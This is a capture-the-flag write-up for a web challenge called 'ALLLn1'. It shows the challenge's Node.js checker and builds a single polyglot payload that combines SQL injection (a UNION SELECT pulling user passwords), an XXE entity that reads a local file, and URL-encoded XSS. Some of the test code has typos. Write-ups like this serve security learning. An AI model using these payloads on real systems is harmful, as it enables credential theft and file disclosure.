# SECURE BUG CTF

It was awesome ctf ,so let's enjoy with writeup.

# web challenges:

## 1- ALLLn1(medium)

![Screenshot at 2021-07-21 12-39-35](https://user-images.githubusercontent.com/52857059/126521585-a4841180-b58a-4e82-b9d3-93429f94495b.png)

if we go to source directory we will see source code of page , it is js code.  

![Screenshot at 2021-07-21 18-16-09](https://user-images.githubusercontent.com/52857059/126523341-739e3200-9c9b-4f6b-9d47-4e8009cf27b6.png)

we notice when returns "parabens hackudo" we get the flag , else we get nope.

let's take second script & test our payload locally

```html
const puppeteer = require('puppeteer')
const mysql = require("mysql")
const util = require('util')
const libxml = require("libxmljs")
const fs = require("fs")
const sanitizeHtml = require("sanitize-html")



function test_xxe(payload) {

	try {
		var my_secret = Math.random().toString(36).substring(2) ;
		fs.writeFileSync("/home/gnx/script/xxe_secret",my_secret)
		var doc = libxml.parseXml(payload, { noent: true ,nonet: true })
		return doc.toString().includes(my_secret) 
		
	} catch (e) {
		return false
	}
} 

async function test_xss(payload) {
	try {
		const browser = await puppeteer.launch({args:['--no-sandbox', '--disable-setuid-sandbox','--disable-dev-shm-usage','--disable-accelerated-2d-canvas','--no-first-run','--no-zygote','--single-process','--disable-gpu']})
		const page = await browser.newPage()
		page.setDefaultNavigationTimeout(1000);
		payload = sanitizeHtml(payload,{allowedTags:[]})
		await page.goto(`data:text/html,<script>${payload}</script>`)
		const check = await page.evaluate("( typeof xss != 'undefined' ? true : false )") // vlw herrera

		await browser.close()
		
		return check

	} catch (error) {
		console.error(error)
	}

}

async function test_sqli(payload) {

	var connection = mysql.createConnection({
		host : process.env.MYSQL_HOST || "127.0.0.1",
		user : process.env.MYSQL_USER,
		password : process.env.MYSQL_PASSWORD,
		database : process.env.MYSQL_DATABASE,
		charset: 'utf8',
    dialectOptions: {
			collate: 'utf8_general_ci',
    },
	})


	const query = util.promisify(connection.query).bind(connection)


	connection.connect()

	const users = await query("SELECT * from users") 
	try {
		const sqli = await query(`SELECT * from posts where id='${payload}'`)
		await connection.end() 
		return JSON.stringify(sqli).includes(users[0]["password"])	
	} catch(e) {
		return false
	}
}

function main(args){

	var xss = test_xss(args[0])
	var sqli = test_sqli(args[0])
	var xxe = test_xxe(args[0])

  Promise.all([xss,sqli]).then( function( values ){
                if ( values[0] && values[1] && xxe ) {
                        console.log("parabens hackudo")
                } else {
                        console.log("hack harder")
                }

                process.exit(0)
        })
	
}

main(process.argv.slice(2))

```
let's start with sqli test :

sql injection payload  
```html 
' UNION SELECT 1, 2 , password FROM users -- - 
```
![Screenshot at 2021-07-21 18-42-41](https://user-images.githubusercontent.com/52857059/126526899-14f9eecd-a648-4d7e-9e7f-84eed2cf6870.png)
 yes, it works

```html
async function test_sqli(payload) {

	var connection = mysql.createConnection({
		host : "127.0.0.1",
		user : "root",
		password : "root",
		database : "foo",
		charset: 'utf8',
    dialectOptions: {
			collate: 'utf8_general_ci',
    },
	})


	const query = util.promisify(connection.query).bind(connection)


	connection.connect()

	const users = await query("SELECT * from users") 
	try {
		const sqli = await query(`SELECT * from posts where id='${payload}'`)
		await connection.end() 
		return JSON.stringify(sqli).includes(users[0]["password"])	
	} catch(e) {
		return false
	}
}

function main() {
	let sql_payload = "' UNION SELECT 1, 2 , password FROM users -- - "
	
	var sqli = test_sqli(payload)

	Promise.all([sqli]).then( function( values ){
		console.log('SQL: ' + values[0])

		process.exit(0)
	})

	
}

```
  if we access this file locally it returns true , so first test is done.
  
  XXE test 
  xxe payload 
  ```html
<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///root/ctf/payload/src/xxe_secret'>]><root>&test;</root>
```
```html
function test_xxe(payload) {

	try {
		var my_secret = Math.random().toString(36).substring(2) ;
		fs.writeFileSync("/root/ctf/payload/src/xxe_secret",my_secret)
		var doc = libxml.parseXml(payload, { noent: true ,nonet: true })
		return doc.toString().includes(my_secret) 

	} catch (e) {
		return false
	}
} 

unction main() {
	let sql_payload = "' UNION SELECT 1, 2 , password FROM users -- - "
	let xxe_payload = "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///root/ctf/payload/src/xxe_secret'>]><root>&test;</root>"
	
	//var sqli = test_sqli(payload)
	var xxe = test_xxe(xxe_payload)
	

	Promise.all([sqli,xss]).then( function( values ){
		console.log('SQL: ' + values[0])
		console.log('XEE: ' + xxe)
		

		process.exit(0)
	})

	
}

```
if we access this file locally it returns true , so second test is done.
  
A Payload to rule them all :
```html 
unction main() {
	
let payload ="<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///home/gnx/scriptxxe_secret\">]><root><textarea>&test;</textarea><script>' UNION SELECT 1, 2 , password FROM users -- -</script><c>%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%3e%78%73%73%3d%31</c></root>"

	var sqli = test_sqli(payload)
	var xxe = test_xxe(payload)
	var xss = test_xss(payload)

	Promise.all([sqli,xss]).then( function( values ){
		console.log('SQL: ' + values[0])
		console.log('XEE: ' + xxe)
		console.log('xss: ' + values[1])

		process.exit(0)
	})
```
if we run this file locally it returns true , so test is done.
last payload --> 
```html
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///home/gnx/script/xxe_secret">]><root><textarea>&test;</textarea><script>' UNION SELECT 1, 2 , password FROM users -- -</script><c>%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%3e%78%73%73%3d%31</c></root>
```
![Screenshot at 2021-07-21 19-18-58](https://user-images.githubusercontent.com/52857059/126531806-2a0f500d-291e-4746-be80-6a8da06ae55e.png)

booom flag SBCTF{It_!s_th3_FL4GSH!P!}

